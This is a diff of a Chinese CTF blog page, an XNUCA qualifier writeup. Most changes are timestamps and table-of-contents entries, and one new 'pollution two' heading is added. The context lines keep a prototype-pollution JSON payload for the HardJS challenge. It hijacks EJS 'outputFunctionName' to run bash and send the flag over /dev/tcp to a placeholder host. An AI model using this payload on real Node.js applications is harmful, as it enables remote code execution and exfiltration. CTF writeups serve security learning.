@@ -131,7 +131,7 @@
 <meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047371/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.55.54_xb4td6.png">
 <meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047546/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8810.58.31_zzuevv.png">
 <meta property="og:image" content="https://res.cloudinary.com/durtftgrv/image/upload/v1567047922/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%8811.05.09_hvkhnw.png">
-<meta property="og:updated_time" content="2019-08-29T03:20:07.741Z">
+<meta property="og:updated_time" content="2019-08-29T03:27:51.941Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XNUCA qualifier writeup">
 <meta name="twitter:description" content="周末打了一下XNUCA，可以说这是打CTF以来难度最高的一个比赛，全场交的flag不到100个也是十分真实，膜精心准备这次比赛的NESE的大师傅们。这里贴一下做出来的两个web题目的writeup与题目分析。  HardJS我们的解法比赛时听说ROIS的师傅们拿了一血而且是直接RCE的，因此便将重点放到了后端的代码审计上。 拿到一个nodejs项目的源码进行审计，第一步便是运行npm audit">
@@ -375,7 +375,7 @@
                 
               
 
-              <time title="Created: 2019-08-29 02:26:12 / Modified: 11:20:07" itemprop="dateCreated datePublished" datetime="2019-08-29T02:26:12+08:00">2019-08-29</time>
+              <time title="Created: 2019-08-29 02:26:12 / Modified: 11:27:51" itemprop="dateCreated datePublished" datetime="2019-08-29T02:26:12+08:00">2019-08-29</time>
             
 
             
@@ -436,7 +436,7 @@
 <p>最后我们的payload如下：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"mmp"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:</span><br><span class="line">&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>只要提交这样的信息并触发合并操作，访问任意页面即可将flag发送到我们的后端。</p>
-<p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
+<h3 id="pollution-two"><a href="#pollution-two" class="headerlink" title="pollution two"></a>pollution two</h3><p>除了这里的<code>outputFunctionName</code>外我们也可以覆盖<code>opts.escapeFunction</code>来实现RCE，具体源码关键点对应如下</p>
 <p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018846/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.00.33_jahw5k.png" alt></p>
 <p><img src="https://res.cloudinary.com/durtftgrv/image/upload/v1567018915/blog/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7_2019-08-29_%E4%B8%8A%E5%8D%883.01.44_rhgtkj.png" alt></p>
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>赛后看了NESE大佬的官方writeup,则利用了前端和后端两个原型链污染的点，后端原型链污染用于绕过登录验证越权登录admin,覆盖<code>login</code>与<code>userid</code>即可</p>
@@ -720,7 +720,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HardJS"><span class="nav-number">1.</span> <span class="nav-text">HardJS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法"><span class="nav-number">1.1.</span> <span class="nav-text">我们的解法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pollution-one"><span class="nav-number">1.1.1.</span> <span class="nav-text">pollution one</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预期解"><span class="nav-number">1.2.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPHP"><span class="nav-number">2.</span> <span class="nav-text">ezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法-1"><span class="nav-number">2.1.</span> <span class="nav-text">我们的解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他非预期解"><span class="nav-number">2.2.</span> <span class="nav-text">其他非预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#非预期1"><span class="nav-number">2.2.1.</span> <span class="nav-text">非预期1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期2"><span class="nav-number">2.3.</span> <span class="nav-text">非预期2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HardJS"><span class="nav-number">1.</span> <span class="nav-text">HardJS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法"><span class="nav-number">1.1.</span> <span class="nav-text">我们的解法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#pollution-one"><span class="nav-number">1.1.1.</span> <span class="nav-text">pollution one</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pollution-two"><span class="nav-number">1.2.</span> <span class="nav-text">pollution two</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预期解"><span class="nav-number">1.3.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezPHP"><span class="nav-number">2.</span> <span class="nav-text">ezPHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#我们的解法-1"><span class="nav-number">2.1.</span> <span class="nav-text">我们的解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他非预期解"><span class="nav-number">2.2.</span> <span class="nav-text">其他非预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#非预期1"><span class="nav-number">2.2.1.</span> <span class="nav-text">非预期1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期2"><span class="nav-number">2.3.</span> <span class="nav-text">非预期2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
             
 
           </div>
